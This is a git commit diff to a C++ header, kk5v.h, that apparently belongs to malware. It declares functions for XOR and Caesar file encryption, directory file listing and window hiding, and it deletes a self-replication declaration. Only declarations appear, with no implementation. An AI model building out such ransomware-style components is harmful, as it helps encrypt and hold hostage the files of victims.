a0d88139e69f575c0e054b86ad318b9ef12f2308
thewifiproject <pierrejacksoo@seznam.cz>
2024-12-23 15:34:53 +0100

    Update kk5v.h

--- kk5v.h
+++ kk5v.h
@@ -7,7 +7,6 @@
 void encryptFileXOR(const std::string& filePath);
 void encryptFileCaesar(const std::string& filePath);
 std::vector<std::string> getFilesInDirectory(const std::string& directory);
-void replicateSelf(const std::string& sourcePath);
 void hideWindow();
 
 #endif // KK5V_H
